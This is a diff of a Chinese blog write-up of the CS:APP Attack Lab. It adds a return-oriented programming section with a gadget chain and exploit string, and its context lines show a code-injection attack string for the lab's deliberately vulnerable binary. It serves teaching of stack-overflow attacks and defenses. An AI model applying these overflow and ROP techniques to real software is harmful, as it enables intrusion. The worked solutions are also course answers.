@@ -91,21 +91,22 @@
 
 
 
-<meta name="description" content="Attack Lab实验代码见GitHub 简介Attack Lab的内容针对的是CS-APP中第三章中关于程序安全性描述中的栈溢出攻击。在这个Lab中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回攻击。本实验也是对旧版本中IA32编写的Buffer Lab的替代。 我们可以从CMU的lab主页来获取自学者版本与实验讲义(W">
+<meta name="description" content="Attack Lab实验代码见GitHub 简介Attack Lab的内容针对的是CS-APP中第三章中关于程序安全性描述中的栈溢出攻击。在这个Lab中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回导向编程攻击。本实验也是对旧版本中IA32编写的Buffer Lab的替代。 我们可以从CMU的lab主页来获取自学者版本与实验">
 <meta name="keywords" content="Computer System,CS:APP">
 <meta property="og:type" content="article">
 <meta property="og:title" content="深入理解计算机系统（CS:APP) - Attack Lab解题报告">
 <meta property="og:url" content="http://www.viseator.com/2017/07/18/CS_APP_AttackLab/index.html">
 <meta property="og:site_name" content="viseator&#39;s blog">
-<meta property="og:description" content="Attack Lab实验代码见GitHub 简介Attack Lab的内容针对的是CS-APP中第三章中关于程序安全性描述中的栈溢出攻击。在这个Lab中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回攻击。本实验也是对旧版本中IA32编写的Buffer Lab的替代。 我们可以从CMU的lab主页来获取自学者版本与实验讲义(W">
+<meta property="og:description" content="Attack Lab实验代码见GitHub 简介Attack Lab的内容针对的是CS-APP中第三章中关于程序安全性描述中的栈溢出攻击。在这个Lab中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回导向编程攻击。本实验也是对旧版本中IA32编写的Buffer Lab的替代。 我们可以从CMU的lab主页来获取自学者版本与实验">
 <meta property="og:image" content="http://www.viseator.com/images/attacklab01.png">
 <meta property="og:image" content="http://www.viseator.com/images/attacklab02.png">
 <meta property="og:image" content="http://www.viseator.com/images/attacklab03.png">
 <meta property="og:image" content="http://www.viseator.com/images/attacklab04.png">
-<meta property="og:updated_time" content="2017-07-18T09:06:01.467Z">
+<meta property="og:image" content="http://www.viseator.com/images/attacklab05.png">
+<meta property="og:updated_time" content="2017-07-18T11:43:50.304Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="深入理解计算机系统（CS:APP) - Attack Lab解题报告">
-<meta name="twitter:description" content="Attack Lab实验代码见GitHub 简介Attack Lab的内容针对的是CS-APP中第三章中关于程序安全性描述中的栈溢出攻击。在这个Lab中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回攻击。本实验也是对旧版本中IA32编写的Buffer Lab的替代。 我们可以从CMU的lab主页来获取自学者版本与实验讲义(W">
+<meta name="twitter:description" content="Attack Lab实验代码见GitHub 简介Attack Lab的内容针对的是CS-APP中第三章中关于程序安全性描述中的栈溢出攻击。在这个Lab中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回导向编程攻击。本实验也是对旧版本中IA32编写的Buffer Lab的替代。 我们可以从CMU的lab主页来获取自学者版本与实验">
 <meta name="twitter:image" content="http://www.viseator.com/images/attacklab01.png">
 
 
@@ -453,7 +454,7 @@
                   <span class="post-meta-item-text">字数统计</span>
                 
                 <span title="字数统计">
-                  2,534
+                  3,767
                 </span>
               
 
@@ -476,7 +477,7 @@
 
       
         <h2 id="Attack-Lab"><a href="#Attack-Lab" class="headerlink" title="Attack Lab"></a>Attack Lab</h2><p>实验代码见<a href="https://github.com/viseator/CS-APP-3e-labs" target="_blank" rel="external">GitHub</a></p>
-<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><code>Attack Lab</code>的内容针对的是<code>CS-APP</code>中第三章中关于程序安全性描述中的栈溢出攻击。在这个<code>Lab</code>中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回攻击。本实验也是对旧版本中<code>IA32</code>编写的<code>Buffer Lab</code>的替代。</p>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><code>Attack Lab</code>的内容针对的是<code>CS-APP</code>中第三章中关于程序安全性描述中的栈溢出攻击。在这个<code>Lab</code>中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回导向编程攻击。本实验也是对旧版本中<code>IA32</code>编写的<code>Buffer Lab</code>的替代。</p>
 <p>我们可以从<a href="http://csapp.cs.cmu.edu/3e/labs.html" target="_blank" rel="external"><code>CMU</code>的<code>lab</code>主页</a>来获取自学者版本与实验讲义(Writeup)，讲义中包含了必要的提示、建议与被禁止的操作，从这个<code>lab</code>开始之后的<code>lab</code>对讲义中内容的依赖还是很强的。</p>
 <blockquote>
 <p>  <strong>特别提示</strong> 本<code>lab</code>的自学者版本需要在运行程序时加上<code>-q</code>参数来避免程序向不存在的评分服务器提交我们的答案导致报错</p>
@@ -486,8 +487,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> buf[BUFFER_SIZE];</div><div class="line">    Gets(buf);</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p><code>getbuf</code>函数在栈中申请了一块<code>BUFFER_SIZE</code>大小的空间，然后利用这块空间首地址作为<code>Gets</code>函数的参数来从标准输入流中读取字符。由于没有对读入字符数量的检查，我们可以通过提供一个超过<code>BUFFER_SIZE</code>的字符串来向<code>getbuf</code>的栈帧之外写入数据。</p>
 <p>在代码注入攻击中就是利用函数返回时<code>RET</code>指令会将调用方在栈中存放的返回地址读入<code>IP</code>中，执行该地址指向的代码。栈溢出后，我们可以改写这个返回地址，指向我们同样存放在栈中的指令，以达到攻击的目的。</p>
-<p>###　第一部分：代码注入攻击</p>
-<h4 id="Level１"><a href="#Level１" class="headerlink" title="Level１"></a>Level１</h4><p>在这个等级中，我们不需要注入任何攻击代码，只需要更改<code>getbuf</code>函数的返回地址执行指定的函数<code>touch1</code>（该函数已经存在于程序中）。</p>
+<h3 id="第一部分：代码注入攻击"><a href="#第一部分：代码注入攻击" class="headerlink" title="第一部分：代码注入攻击"></a>第一部分：代码注入攻击</h3><h4 id="Level１"><a href="#Level１" class="headerlink" title="Level１"></a>Level１</h4><p>在这个等级中，我们不需要注入任何攻击代码，只需要更改<code>getbuf</code>函数的返回地址执行指定的函数<code>touch1</code>（该函数已经存在于程序中）。</p>
 <p>那么我们需要做的就是将栈中存放返回地址的位置改为<code>touch1</code>函数的入口地址，问题在于我们如何将地址精确地写入到原来的地址的位置。</p>
 <p>讲义给出了<code>getbuf</code>的调用函数：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> val;</div><div class="line">    val = getbuf();</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
@@ -534,6 +534,38 @@
 <p>上面列出的这部分指令都会向栈中压入新的内容，由于栈向下增长，而<code>rsp</code>一开始的位置在<code>touch3</code>地址的下一个位置，压入的新内容会覆盖<code>touch3</code>地址以下的内容，如果把目标字符串放在这部分会导致内容在比较之前就被覆盖。</p>
 <p>知道栈中应该存放的内容的结构，攻击字符串的编写就不再困难了：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">48 c7 c7 90 dc 61 55 48 # mov    $0x5561dc90,%rdi mov    $0x5561dc88,%rsp ret 为寄存器赋值并返回</div><div class="line">c7 c4 88 dc 61 55 c3 00</div><div class="line">fa 18 40 00 00 00 00 00 # touch3地址</div><div class="line">35 39 62 39 39 37 66 61 # 目标字符串</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">78 dc 61 55 00 00 00 00 # 注入指令首地址</div></pre></td></tr></table></figure>
+<h3 id="第二部分：返回导向编程攻击"><a href="#第二部分：返回导向编程攻击" class="headerlink" title="第二部分：返回导向编程攻击"></a>第二部分：返回导向编程攻击</h3><p>我们在第二部分中需要解决的同样是第一部分的后两个问题，只不过我们要采取不同的方式来进行攻击。</p>
+<p>为什么我们之前采取的代码注入的攻击手段无法在这个程序中起作用呢？这是国因为这个程序对代码注入攻击采取了两种防护方式：</p>
+<ul>
+<li>栈随机化，使得程序每次运行时栈的地址都不相同，我们无法得知我们注入的攻击代码的地址，也无法在攻击代码中硬编码栈中的地址。</li>
+<li>标记内存中的栈段为不可执行，这意味着注入在栈中的代码无法被程序执行。</li>
+</ul>
+<p>尽管这两种手段有效地避免了代码注入攻击，但是我们仍然可以找到方式让程序执行我们想要去执行的指令。</p>
+<h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><p>现在我们无法使用栈来存放代码，但是我们仍可以设置栈中的内容。不能注入代码去执行，我们还可以利用程序中原有的代码，利用<code>ret</code>指令跳转的特性，去执行程序中已经存在的指令。具体的方式如下：</p>
+<p>我们可以在程序的汇编代码中找到这样的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0000000000400f15 &lt;setval_210&gt;:</div><div class="line">400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)</div><div class="line">400f1b: c3 retq</div></pre></td></tr></table></figure>
+<p>这段代码的本意是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span></div><div class="line">&#123;</div><div class="line">    *p = <span class="number">3347663060U</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这样一个函数，但是通过观察我们可以发现，汇编代码的最后部分：<code>48 89 c7 c3</code>又可以代表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">movq %rax, %rdi</div><div class="line">ret</div></pre></td></tr></table></figure>
+<p>这两条指令（指令的编码可以见讲义中的附录）。</p>
+<p>第1行的<code>movq</code>指令可以作为攻击代码的一部分来使用，那么我们怎么去执行这个代码呢？我们知道这个函数的入口地址是<code>0x400f15</code>，这个地址也是这条指令的地址。我们可以通过计算得出<code>48 89 c7 c3</code>这条指令的首地址是<code>0x400f18</code>，我们只要把这个地址存放在栈中，在执行<code>ret</code>指令的时候就会跳转到这个地址，执行<code>48 89 c7 c3</code>编码的指令。同时，我们可以注意到这个指令的最后是<code>c3</code>编码的是<code>ret</code>指令，利用这一点，我们就可以把多个这样的指令地址依次放在栈中，每次<code>ret</code>之后就会去执行栈中存放的下一个地址指向的指令，只要合理地放置这些地址，我们就可以执行我们想要执行的命令从而达到攻击的目的。</p>
+<p><img src="/images/attacklab05.png" alt=""></p>
+<p>这样的一串以<code>ret</code>结尾的指令，被称为<code>gadget</code>。我们要攻击的程序中为我们设置了一个<code>gadget_farm</code>，为我们提供了一系列这样可以执行的攻击指令，同时我们也只被允许使用程序中<code>start_farm</code>与<code>end_farm</code>函数标识之间的<code>gadget</code>来构建我们的攻击字符串。</p>
+<p>这种攻击方式被称为返回导向编程攻击。</p>
+<h4 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h4><p>目的与之前的<code>Level 2</code>相同，我们需要为<code>rdi</code>赋上<code>cookie</code>值，再跳转到<code>touch2</code>函数执行，跳转到<code>touch2</code>只需要将<code>touch2</code>的入口地址放在最后一个<code>gadget</code>之后，在它的<code>ret</code>指令执行之后就会返回到<code>touch2</code>中。</p>
+<p>下面就要利用已有的<code>gadget</code>为<code>rdi</code>赋上我们想要的值。这里我们要将一个特定的值写入<code>rdi</code>，但是我们只可以使用栈来存放这个数值，同时不知道栈的地址，这个时候我们可以想到使用<code>pop</code>指令令这个值从栈中弹出到寄存器中。</p>
+<p>查看<code>gadget</code>中提供的我们可以执行指令。发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">00000000004019a7 &lt;addval_219&gt;: </div><div class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</div><div class="line">  4019ad:	c3                   	retq</div></pre></td></tr></table></figure>
+<p>中最后的字节为<code>58 90 c3</code>，这个三个字节分别编码了三条指令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">popq %rax</div><div class="line">nop</div><div class="line">ret</div></pre></td></tr></table></figure>
+<p>这个<code>nop</code>在这里当然不影响，利用这个<code>pop</code>指令我们就可以把栈中存放的内容弹出到<code>rax</code>中。接下来我们需要的是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">movq %rax,%rdi</div></pre></td></tr></table></figure>
+<p>这条指令，如果没有的话可以多传几次，正好我们发现了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">00000000004019c3 &lt;setval_426&gt;: </div><div class="line">  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</div><div class="line">  4019c9:	c3                   	retq</div></pre></td></tr></table></figure>
+<p>中最后的字节<code>48 89 c7 90 c3</code>编码了这样的指令。</p>
+<p>我们分别计算这些需要执行的<code>gadget</code>的指令地址，写成攻击字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00 # 前0x28个字符填充0x00</div><div class="line">ab 19 40 00 00 00 00 00 # popq %rax </div><div class="line">fa 97 b9 59 00 00 00 00 # cookie （popq的目标）</div><div class="line">a2 19 40 00 00 00 00 00 # movq %rax,%rdi</div><div class="line">ec 17 40 00 00 00 00 00 # 返回到 touch2</div></pre></td></tr></table></figure>
 
       
     </div>
@@ -775,7 +807,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-Lab"><span class="nav-number">1.</span> <span class="nav-text">Attack Lab</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简介"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#前置"><span class="nav-number">1.2.</span> <span class="nav-text">前置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Level１"><span class="nav-number">1.2.1.</span> <span class="nav-text">Level１</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-2"><span class="nav-number">1.2.2.</span> <span class="nav-text">Level 2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-3"><span class="nav-number">1.2.3.</span> <span class="nav-text">Level 3</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-Lab"><span class="nav-number">1.</span> <span class="nav-text">Attack Lab</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简介"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#前置"><span class="nav-number">1.2.</span> <span class="nav-text">前置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第一部分：代码注入攻击"><span class="nav-number">1.3.</span> <span class="nav-text">第一部分：代码注入攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Level１"><span class="nav-number">1.3.1.</span> <span class="nav-text">Level１</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">Level 2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-3"><span class="nav-number">1.3.3.</span> <span class="nav-text">Level 3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二部分：返回导向编程攻击"><span class="nav-number">1.4.</span> <span class="nav-text">第二部分：返回导向编程攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击方式"><span class="nav-number">1.4.1.</span> <span class="nav-text">攻击方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-2-1"><span class="nav-number">1.4.2.</span> <span class="nav-text">Level 2</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
